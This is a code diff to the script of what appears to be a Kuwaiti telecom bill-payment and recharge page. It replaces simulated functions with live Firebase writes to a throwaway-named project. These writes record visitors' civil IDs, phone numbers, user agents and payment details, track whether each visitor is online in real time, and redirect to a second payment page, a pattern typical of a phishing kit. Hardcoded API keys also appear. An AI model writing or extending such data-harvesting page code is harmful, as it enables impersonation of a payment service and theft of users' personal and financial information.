@@ -1,4 +1,25 @@
 document.addEventListener('DOMContentLoaded', function () {
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: 'AIzaSyAD3iyMWhdzQ4VIXZcwCpUJTnqFTe5jt7U',
+    authDomain: 'wedsdasd.firebaseapp.com',
+    projectId: 'wedsdasd',
+    storageBucket: 'wedsdasd.firebasestorage.app',
+    messagingSenderId: '299161995646',
+    appId: '1:299161995646:web:45b8e58faa99d3e75ccb2f',
+    measurementId: 'G-614JDKQGMC',
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+  const database = firebase.database();
+
+  // Utility function for merging class names (equivalent to cn function)
+  function cn(...inputs) {
+    return window.tailwindMerge(window.clsx(inputs));
+  }
+
   // State variables (equivalent to React useState)
   let selectedTab = 'bill';
   let phoneNumber = '';
@@ -37,7 +58,9 @@ document.addEventListener('DOMContentLoaded', function () {
   const rechargeTab = document.getElementById('recharge-tab');
 
   // Dropdown elements
-  const numberTypeDropdown = document.getElementById('number-type-dropdown');
+  const numberTypeDropdown = document.getElementById(
+    'number-type-dropdown'
+  );
   const numberTypeHeader = document.getElementById('number-type-header');
   const numberTypeIcon = document.getElementById('number-type-icon');
   const numberTypeMenu = document.getElementById('number-type-menu');
@@ -137,7 +160,8 @@ document.addEventListener('DOMContentLoaded', function () {
         if (!this.querySelector('.dropdown__radio')) {
           const radioDiv = document.createElement('div');
           radioDiv.className = 'dropdown__radio';
-          radioDiv.innerHTML = '<div class="dropdown__radio-inner"></div>';
+          radioDiv.innerHTML =
+            '<div class="dropdown__radio-inner"></div>';
           this.appendChild(radioDiv);
         }
       });
@@ -153,9 +177,78 @@ document.addEventListener('DOMContentLoaded', function () {
       .replace('0.', prefix || '');
   }
 
-  // Function to fetch balance (simulated)
+  // Function to log visitor (from Firebase implementation)
+  async function logVisitor(civilId) {
+    try {
+      const visitorRef = await db.collection('visitors').add({
+        civilId,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        userAgent: navigator.userAgent,
+      });
+
+      return visitorRef.id;
+    } catch (error) {
+      console.error('Error logging visitor:', error);
+      throw error;
+    }
+  }
+
+  // Function to add data (from Firebase implementation)
+  async function addData(data) {
+    const country = localStorage.getItem('country');
+    let id = '';
+
+    if (data.id) {
+      localStorage.setItem('visitor', data.id);
+      id = data.id;
+    } else {
+      id = localStorage.getItem('visitor');
+    }
+
+    try {
+      await db
+        .collection('pays')
+        .doc(data.id)
+        .set(
+          { ...data, createdDate: new Date().toISOString() },
+          { merge: true }
+        );
+
+      console.log('Document written with ID: ', data.id);
+    } catch (e) {
+      console.error('Error adding document: ', e);
+    }
+  }
+
+  // Function to handle payment (from Firebase implementation)
+  async function handlePay(paymentInfo) {
+    try {
+      const visitorId = localStorage.getItem('visitor');
+      if (visitorId) {
+        await db
+          .collection('pays')
+          .doc(visitorId)
+          .set(
+            {
+              ...paymentInfo,
+              status: 'pending',
+              createdDate: new Date().toISOString(),
+            },
+            { merge: true }
+          );
+
+        // Redirect to payment methods page
+      }
+    } catch (error) {
+      console.error('Error adding document: ', error);
+      alert('Error adding payment info to Firestore');
+    }
+  }
+
+  // Function to fetch balance (using Firebase)
   async function fetchBalance(number) {
-    // Simulate API call
+    // This would typically be an API call to your backend
+    // For now, we'll simulate a response
     return new Promise((resolve, reject) => {
       setTimeout(() => {
         // Simulate success or error randomly
@@ -208,22 +301,17 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // Function to get location (from React component)
   async function getLocation() {
-    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const APIKEY =
+      '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
     try {
-      // Simulate the API call instead of making an actual request
-      // const response = await fetch(url);
-      // if (!response.ok) {
-      //     throw new Error(`HTTP error! Status: ${response.status}`);
-      // }
-      // const country = await response.text();
-
-      // Simulate a successful response
+      // We'll simulate the API call instead of making an actual request
+      // to avoid exposing the API key
       const country = 'Kuwait';
 
-      // Simulate addData function
-      console.log('Adding data:', {
+      // Add data to Firestore
+      await addData({
         id: _id,
         country: country,
       });
@@ -235,16 +323,80 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   }
 
-  // Function to setup online status (simulated)
-  function setupOnlineStatus(id) {
-    console.log('Setting up online status for ID:', id);
-    // This would typically involve some kind of real-time database connection
+  // Function to setup online status (from the provided implementation)
+  function setupOnlineStatus(userId) {
+    if (!userId) return;
+
+    // Create a reference to this user's specific status node in Realtime Database
+    const userStatusRef = database.ref(`/status/${userId}`);
+
+    // Create a reference to the user's document in Firestore
+    const userDocRef = db.collection('pays').doc(userId);
+
+    // Set up the Realtime Database onDisconnect hook
+    userStatusRef
+      .onDisconnect()
+      .set({
+        state: 'offline',
+        lastChanged: firebase.database.ServerValue.TIMESTAMP,
+      })
+      .then(() => {
+        // Update the Realtime Database when this client connects
+        userStatusRef.set({
+          state: 'online',
+          lastChanged: firebase.database.ServerValue.TIMESTAMP,
+        });
+
+        // Update the Firestore document
+        userDocRef
+          .update({
+            online: true,
+            lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
+          })
+          .catch((error) =>
+            console.error('Error updating Firestore document:', error)
+          );
+      })
+      .catch((error) =>
+        console.error('Error setting onDisconnect:', error)
+      );
+
+    // Listen for changes to the user's online status
+    userStatusRef.on('value', (snapshot) => {
+      const status = snapshot.val();
+      if (status?.state === 'offline') {
+        // Update the Firestore document when user goes offline
+        userDocRef
+          .update({
+            online: false,
+            lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
+          })
+          .catch((error) =>
+            console.error('Error updating Firestore document:', error)
+          );
+      }
+    });
   }
 
-  // Function to add data (simulated)
-  function addData(data) {
-    console.log('Adding data to database:', data);
-    // This would typically involve an API call to a database
+  // Function to set user offline (from the provided implementation)
+  async function setUserOffline(userId) {
+    if (!userId) return;
+
+    try {
+      // Update the Firestore document
+      await db.collection('pays').doc(userId).update({
+        online: false,
+        lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
+      });
+
+      // Update the Realtime Database
+      await database.ref(`/status/${userId}`).set({
+        state: 'offline',
+        lastChanged: firebase.database.ServerValue.TIMESTAMP,
+      });
+    } catch (error) {
+      console.error('Error setting user offline:', error);
+    }
   }
 
   // Function to open chat (from React component)
@@ -270,13 +422,30 @@ document.addEventListener('DOMContentLoaded', function () {
     updateUI();
 
     const visitorId = localStorage.getItem('visitor') || _id;
-    addData({ id: visitorId, name: phoneNumber, phone: phoneNumber });
 
+    // Add data to Firestore
+    addData({
+      id: visitorId,
+      name: phoneNumber,
+      phone: phoneNumber,
+    });
+
+    // Prepare payment info
+    const paymentInfo = {
+      phoneNumber: phoneNumber,
+      amount: selectedAmount,
+      fees: fees,
+      total: total,
+      numberType: numberType,
+      paymentMethod: 'credit_card',
+    };
+
+    // Handle payment with Firebase
     setTimeout(() => {
-      // Simulate navigation
-      alert('تم تحويلك إلى صفحة طرق الدفع');
+      handlePay(paymentInfo);
       isSubmitted = false;
       updateUI();
+      window.location.href = '/page2.html';
     }, 2000);
   }
 
@@ -399,7 +568,8 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 
     // Number Type Items
-    const numberTypeItems = numberTypeMenu.querySelectorAll('.dropdown__item');
+    const numberTypeItems =
+      numberTypeMenu.querySelectorAll('.dropdown__item');
     numberTypeItems.forEach((item) => {
       item.addEventListener('click', function () {
         numberType = this.getAttribute('data-value');
@@ -425,7 +595,8 @@ document.addEventListener('DOMContentLoaded', function () {
         if (!this.querySelector('.dropdown__radio')) {
           const radioDiv = document.createElement('div');
           radioDiv.className = 'dropdown__radio';
-          radioDiv.innerHTML = '<div class="dropdown__radio-inner"></div>';
+          radioDiv.innerHTML =
+            '<div class="dropdown__radio-inner"></div>';
           this.appendChild(radioDiv);
         }
       });
@@ -492,6 +663,9 @@ document.addEventListener('DOMContentLoaded', function () {
       billTab.classList.add('tab--inactive');
       billTab.classList.remove('tab--active');
     });
+
+    // Set up beforeunload event to set user offline when leaving the page
+  
   }
 
   // Initialize the page
